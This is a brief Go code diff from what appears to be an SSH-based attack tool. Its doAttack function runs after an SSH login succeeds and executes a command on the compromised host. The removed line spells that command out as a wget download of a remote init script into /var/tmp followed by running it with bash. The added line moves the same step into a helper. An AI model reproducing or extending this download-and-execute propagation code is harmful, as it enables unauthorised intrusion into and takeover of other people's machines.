@@ -83,9 +83,9 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 	//login ok ,then start to attack
 	var ap *attack.AttackProcess
 
-	initUrl := slog.attackTasks.DownloadInitUrl(host, port, SSHNOPassWordLoginAttackType, "init.sh.tpl")
+	initUrl := slog.attackTasks.DownloadInitUrl(host, port, SSHNOPassWordLoginAttackType, "init.sh")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
+	cmd := slog.attackTasks.InitCmdForLinux(initUrl)
 
 	result, err := sshClient.RunCmd(cmd)
 
